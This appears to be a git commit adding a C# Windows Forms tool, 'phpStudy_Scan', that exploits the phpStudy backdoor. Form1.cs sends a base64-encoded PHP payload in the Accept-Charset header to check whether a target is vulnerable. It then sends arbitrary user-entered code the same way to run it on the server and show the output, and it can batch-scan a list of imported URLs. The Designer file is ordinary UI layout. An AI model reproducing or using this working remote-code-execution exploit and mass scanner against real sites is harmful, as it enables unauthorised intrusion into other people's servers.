262e66ee2e729ce8ef6dfeb620e8d0d764f4543f
0xFlag <54313514+0xFlag@users.noreply.github.com>
2019-09-28 10:27:18 +0800

    Add files via upload

---
+++ phpStudy_Scan/Form1.Designer.cs
@@ -0,0 +1,285 @@
+﻿namespace phpStudy_Scan
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            this.label1 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label2 = new System.Windows.Forms.Label();
+            this.button2 = new System.Windows.Forms.Button();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.tabControl1 = new System.Windows.Forms.TabControl();
+            this.tabPage1 = new System.Windows.Forms.TabPage();
+            this.tabPage2 = new System.Windows.Forms.TabPage();
+            this.listView1 = new System.Windows.Forms.ListView();
+            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
+            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripMenuItem3 = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripMenuItem4 = new System.Windows.Forms.ToolStripMenuItem();
+            this.toolStripMenuItem5 = new System.Windows.Forms.ToolStripMenuItem();
+            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.tabControl1.SuspendLayout();
+            this.tabPage1.SuspendLayout();
+            this.tabPage2.SuspendLayout();
+            this.contextMenuStrip1.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(6, 17);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(29, 12);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "URL:";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(47, 14);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(150, 21);
+            this.textBox1.TabIndex = 1;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(203, 12);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 2;
+            this.button1.Text = "test";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(47, 47);
+            this.textBox2.Multiline = true;
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(150, 21);
+            this.textBox2.TabIndex = 3;
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(6, 50);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(35, 12);
+            this.label2.TabIndex = 4;
+            this.label2.Text = "Code:";
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(203, 45);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 5;
+            this.button2.Text = "getCode";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(5, 78);
+            this.textBox3.Multiline = true;
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(420, 195);
+            this.textBox3.TabIndex = 6;
+            // 
+            // tabControl1
+            // 
+            this.tabControl1.Controls.Add(this.tabPage1);
+            this.tabControl1.Controls.Add(this.tabPage2);
+            this.tabControl1.Location = new System.Drawing.Point(13, 12);
+            this.tabControl1.Name = "tabControl1";
+            this.tabControl1.SelectedIndex = 0;
+            this.tabControl1.Size = new System.Drawing.Size(440, 305);
+            this.tabControl1.TabIndex = 7;
+            // 
+            // tabPage1
+            // 
+            this.tabPage1.Controls.Add(this.textBox1);
+            this.tabPage1.Controls.Add(this.textBox3);
+            this.tabPage1.Controls.Add(this.label1);
+            this.tabPage1.Controls.Add(this.button2);
+            this.tabPage1.Controls.Add(this.button1);
+            this.tabPage1.Controls.Add(this.label2);
+            this.tabPage1.Controls.Add(this.textBox2);
+            this.tabPage1.Location = new System.Drawing.Point(4, 22);
+            this.tabPage1.Name = "tabPage1";
+            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
+            this.tabPage1.Size = new System.Drawing.Size(432, 279);
+            this.tabPage1.TabIndex = 0;
+            this.tabPage1.Text = "test";
+            this.tabPage1.UseVisualStyleBackColor = true;
+            // 
+            // tabPage2
+            // 
+            this.tabPage2.Controls.Add(this.listView1);
+            this.tabPage2.Location = new System.Drawing.Point(4, 22);
+            this.tabPage2.Name = "tabPage2";
+            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
+            this.tabPage2.Size = new System.Drawing.Size(432, 279);
+            this.tabPage2.TabIndex = 1;
+            this.tabPage2.Text = "testing";
+            this.tabPage2.UseVisualStyleBackColor = true;
+            // 
+            // listView1
+            // 
+            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.columnHeader1,
+            this.columnHeader2,
+            this.columnHeader3,
+            this.columnHeader4});
+            this.listView1.ContextMenuStrip = this.contextMenuStrip1;
+            this.listView1.FullRowSelect = true;
+            this.listView1.GridLines = true;
+            this.listView1.Location = new System.Drawing.Point(5, 6);
+            this.listView1.Name = "listView1";
+            this.listView1.Size = new System.Drawing.Size(420, 267);
+            this.listView1.TabIndex = 0;
+            this.listView1.UseCompatibleStateImageBehavior = false;
+            this.listView1.View = System.Windows.Forms.View.Details;
+            // 
+            // columnHeader1
+            // 
+            this.columnHeader1.Text = "ID";
+            // 
+            // columnHeader2
+            // 
+            this.columnHeader2.Text = "Urls";
+            this.columnHeader2.Width = 200;
+            // 
+            // columnHeader3
+            // 
+            this.columnHeader3.Text = "Results";
+            this.columnHeader3.Width = 75;
+            // 
+            // contextMenuStrip1
+            // 
+            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
+            this.toolStripMenuItem1,
+            this.toolStripMenuItem2,
+            this.toolStripMenuItem3,
+            this.toolStripMenuItem4,
+            this.toolStripMenuItem5});
+            this.contextMenuStrip1.Name = "contextMenuStrip1";
+            this.contextMenuStrip1.Size = new System.Drawing.Size(125, 114);
+            // 
+            // toolStripMenuItem1
+            // 
+            this.toolStripMenuItem1.Name = "toolStripMenuItem1";
+            this.toolStripMenuItem1.Size = new System.Drawing.Size(152, 22);
+            this.toolStripMenuItem1.Text = "导入文本";
+            this.toolStripMenuItem1.Click += new System.EventHandler(this.toolStripMenuItem1_Click);
+            // 
+            // toolStripMenuItem2
+            // 
+            this.toolStripMenuItem2.Name = "toolStripMenuItem2";
+            this.toolStripMenuItem2.Size = new System.Drawing.Size(152, 22);
+            this.toolStripMenuItem2.Text = "批量检测";
+            this.toolStripMenuItem2.Click += new System.EventHandler(this.toolStripMenuItem2_Click);
+            // 
+            // toolStripMenuItem3
+            // 
+            this.toolStripMenuItem3.Name = "toolStripMenuItem3";
+            this.toolStripMenuItem3.Size = new System.Drawing.Size(152, 22);
+            this.toolStripMenuItem3.Text = "复制网址";
+            this.toolStripMenuItem3.Click += new System.EventHandler(this.toolStripMenuItem3_Click);
+            // 
+            // toolStripMenuItem4
+            // 
+            this.toolStripMenuItem4.Name = "toolStripMenuItem4";
+            this.toolStripMenuItem4.Size = new System.Drawing.Size(152, 22);
+            this.toolStripMenuItem4.Text = "导出结果";
+            this.toolStripMenuItem4.Click += new System.EventHandler(this.toolStripMenuItem4_Click);
+            // 
+            // toolStripMenuItem5
+            // 
+            this.toolStripMenuItem5.Name = "toolStripMenuItem5";
+            this.toolStripMenuItem5.Size = new System.Drawing.Size(152, 22);
+            this.toolStripMenuItem5.Text = "清空文本";
+            this.toolStripMenuItem5.Click += new System.EventHandler(this.toolStripMenuItem5_Click);
+            // 
+            // columnHeader4
+            // 
+            this.columnHeader4.Text = "states";
+            this.columnHeader4.Width = 75;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(464, 322);
+            this.Controls.Add(this.tabControl1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
+            this.MaximizeBox = false;
+            this.Name = "Form1";
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "phpStudy_Scan";
+            this.tabControl1.ResumeLayout(false);
+            this.tabPage1.ResumeLayout(false);
+            this.tabPage1.PerformLayout();
+            this.tabPage2.ResumeLayout(false);
+            this.contextMenuStrip1.ResumeLayout(false);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Button button2;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.TabControl tabControl1;
+        private System.Windows.Forms.TabPage tabPage1;
+        private System.Windows.Forms.TabPage tabPage2;
+        private System.Windows.Forms.ListView listView1;
+        private System.Windows.Forms.ColumnHeader columnHeader1;
+        private System.Windows.Forms.ColumnHeader columnHeader2;
+        private System.Windows.Forms.ColumnHeader columnHeader3;
+        private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;
+        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;
+        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem2;
+        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem3;
+        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem4;
+        private System.Windows.Forms.ToolStripMenuItem toolStripMenuItem5;
+        private System.Windows.Forms.ColumnHeader columnHeader4;
+    }
+}
+
---
+++ phpStudy_Scan/Form1.cs
@@ -0,0 +1,297 @@
+﻿using HttpCodeLib;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace phpStudy_Scan
+{
+    public partial class Form1 : Form
+    {
+        public string flag;
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (this.textBox1.Text == "")
+            {
+                MessageBox.Show("No Url");
+            }
+            else
+            {
+                HttpHelpers httpHelpers = new HttpHelpers();
+                HttpItems httpItems = new HttpItems();
+                HttpResults httpResults = new HttpResults();
+                httpItems.URL = this.textBox1.Text;
+                httpItems.Timeout = 5000;
+                httpItems.Accept = "*/*";
+                httpItems.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)";
+                httpItems.ContentType = "application/x-www-form-urlencoded";
+                httpItems.Header.Add("Accept-Encoding", "gzip,deflate");
+                httpItems.Header.Add("Accept-Charset", "cHJpbnQoIkEtWkBRQVFAMC05Lk9LIik7");
+                httpItems.Method = "Get";
+                httpResults = httpHelpers.GetHtml(httpItems);
+                if (httpResults.Html.Contains("A-Z@QAQ@0-9.OK"))
+                {
+                    MessageBox.Show("Target Has Vul");
+                }
+                else
+                {
+                    MessageBox.Show("No Vul");
+                }
+            }
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            //system("whoami");
+            if (this.textBox1.Text == "")
+            {
+                MessageBox.Show("No Url");
+            }
+            else if (this.textBox2.Text == "")
+            {
+                MessageBox.Show("No Code");
+            }
+            else
+            {
+                HttpHelpers httpHelpers = new HttpHelpers();
+                HttpItems httpItems = new HttpItems();
+                HttpResults httpResults = new HttpResults();
+                httpItems.URL = this.textBox1.Text;
+                httpItems.Timeout = 5000;
+                httpItems.Accept = "*/*";
+                httpItems.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)";
+                httpItems.ContentType = "application/x-www-form-urlencoded";
+                httpItems.Header.Add("Accept-Encoding", "gzip,deflate");
+                httpItems.Header.Add("Accept-Charset", "cHJpbnQoIkEtWkBRQVFAMC05Lk9LIik7");
+                httpItems.Method = "Get";
+                httpResults = httpHelpers.GetHtml(httpItems);
+                if (httpResults.Html.Contains("A-Z@QAQ@0-9.OK"))
+                {
+                    get_code();
+                }
+                else
+                {
+                    MessageBox.Show("No Vul");
+                }
+                
+            }
+        }
+
+        public void get_code()
+        {
+            byte[] bytes = Encoding.GetEncoding("gb2312").GetBytes(this.textBox2.Text);
+            string value = Convert.ToBase64String(bytes);
+            HttpHelpers httpHelpers = new HttpHelpers();
+            HttpItems httpItems = new HttpItems();
+            HttpResults httpResults = new HttpResults();
+            httpItems.URL = this.textBox1.Text;
+            httpItems.Timeout = 5000;
+            httpItems.Accept = "*/*";
+            httpItems.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)";
+            httpItems.ContentType = "application/x-www-form-urlencoded";
+            httpItems.Header.Add("Accept-Encoding", "gzip,deflate");
+            httpItems.Header.Add("Accept-Charset", value);
+            httpItems.Method = "Get";
+            httpResults = httpHelpers.GetHtml(httpItems);
+            string html = httpResults.Html;
+            this.textBox3.Text = html;
+        }
+
+        private void toolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            this.listView1.Items.Clear();
+            OpenFileDialog ofd = new OpenFileDialog();
+            if (ofd.ShowDialog() == DialogResult.OK)
+            {
+                if (ofd.FileName != "")
+                {
+                    StreamReader sr = new StreamReader(ofd.FileName);
+                    List<ListViewItem> items = new List<ListViewItem>();
+                    while (true)
+                    {
+                        string line = sr.ReadLine();
+                        if (line == null)
+                        {
+                            break;
+                        }
+                        if (line.Equals(""))
+                        {
+                            continue;
+                        }
+
+                        String url = line.Trim();
+                        ListViewItem lvi = new ListViewItem();
+                        lvi.SubItems[0].Text = Convert.ToString(listView1.Items.Count + 1);
+                        lvi.SubItems.Add(url);
+                        lvi.SubItems.Add("Null");
+                        lvi.SubItems.Add("0");
+                        items.Add(lvi);
+                        if (items.Count > 100)
+                        {
+                            listView1.Items.AddRange(items.ToArray());
+                            items.Clear();
+                        }
+                    }
+                    if (items.Count > 0)
+                    {
+                        listView1.Items.AddRange(items.ToArray());
+                    }
+                    sr.Close();
+                    resetListViewIndex(listView1);
+                }
+            }
+        }
+
+        private void resetListViewIndex(ListView listView)
+        {
+            for (int i = 0; i < listView.Items.Count; i++)
+            {
+
+                if (Convert.ToInt32(listView.Items[i].SubItems[0].Text) == i + 1)
+                {
+                    continue;
+                }
+                listView.Items[i].SubItems[0].Text = Convert.ToString(i + 1);
+            }
+        }
+
+        private void toolStripMenuItem2_Click(object sender, EventArgs e)
+        {
+            if (this.listView1.Items.Count < 1)
+            {
+                return;
+            }
+            else
+            {
+                Thread batchPoolThread = new Thread(batchPool);
+                batchPoolThread.Start();
+            }
+            
+        }
+
+        private void batchPool() 
+        {
+            for (int i = 0; i < this.listView1.Items.Count; i++)
+            {
+                try
+                {
+                    string url = this.listView1.Items[i].SubItems[1].Text;
+                    HttpHelpers httpHelpers = new HttpHelpers();
+                    HttpItems httpItems = new HttpItems();
+                    HttpResults httpResults = new HttpResults();
+                    httpItems.URL = url;
+                    httpItems.Timeout = 5000;
+                    httpItems.Accept = "*/*";
+                    httpItems.UserAgent = "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)";
+                    httpItems.ContentType = "application/x-www-form-urlencoded";
+                    httpItems.Header.Add("Accept-Encoding", "gzip,deflate");
+                    httpItems.Header.Add("Accept-Charset", "cHJpbnQoIkEtWkBRQVFAMC05Lk9LIik7");
+                    httpItems.Method = "Get";
+                    httpResults = httpHelpers.GetHtml(httpItems);
+                    if (httpResults.Html.Contains("A-Z@QAQ@0-9.OK"))
+                    {
+                        flag = "1";
+                        //MessageBox.Show("Target Has Vul");
+                    }
+                    else
+                    {
+                        flag = "0";
+                        //MessageBox.Show("No Vul");
+                    }
+                }
+                catch { }
+                finally
+                {
+                    if (flag == "1")
+                    {
+                        this.listView1.Items[i].ForeColor = Color.DarkGray;
+                        this.listView1.Items[i].SubItems[2].Text = "Has Vul";
+                        this.listView1.Items[i].SubItems[3].Text = "1";
+                        //MessageBox.Show("Target Has Vul");
+                    }
+                    else
+                    {
+                        this.listView1.Items[i].ForeColor = Color.DarkGray;
+                        this.listView1.Items[i].SubItems[2].Text = "No Vul";
+                        this.listView1.Items[i].SubItems[3].Text = "1";
+                        //MessageBox.Show("No Vul");
+                    }
+                    Thread.Sleep(1);
+                }
+            }
+        }
+
+        private void toolStripMenuItem3_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                Clipboard.SetDataObject(this.listView1.SelectedItems[0].SubItems[1].Text);
+            }
+            catch
+            {
+            }
+        }
+
+        private void toolStripMenuItem4_Click(object sender, EventArgs e)
+        {
+            SaveFileDialog sfd = new SaveFileDialog();
+            sfd.FileName = System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".txt";
+            if (sfd.FileName != "" && sfd.ShowDialog() == DialogResult.OK)
+            {
+                sfd.RestoreDirectory = true;
+                sfd.CreatePrompt = true;
+                StreamWriter sw = File.CreateText(sfd.FileName);
+                for (int i = 0; i < this.listView1.Items.Count; i++)
+                {
+                    try
+                    {
+                        string line = i.ToString();
+                        line += ("|" + this.listView1.Items[i].SubItems[1].Text);
+                        if (String.IsNullOrEmpty(this.listView1.Items[i].SubItems[2].Text))
+                        {
+                            line += ("|" + "null");
+                        }
+                        else
+                        {
+                            line += ("|" + this.listView1.Items[i].SubItems[2].Text);
+                        }
+                        if (String.IsNullOrEmpty(this.listView1.Items[i].SubItems[3].Text))
+                        {
+                            line += ("|" + "null");
+                        }
+                        else
+                        {
+                            line += ("|" + this.listView1.Items[i].SubItems[3].Text);
+                        }
+                        sw.WriteLine(line);
+                    }
+                    catch { }
+                }
+                sw.Close();
+                MessageBox.Show("Save Success!");
+            }
+        }
+
+        private void toolStripMenuItem5_Click(object sender, EventArgs e)
+        {
+            DialogResult r = MessageBox.Show("确定要清空文本吗?", "", MessageBoxButtons.YesNo);
+            if (r == DialogResult.Yes)
+            {
+                this.listView1.Items.Clear();
+            }
+        }
+    }
+}
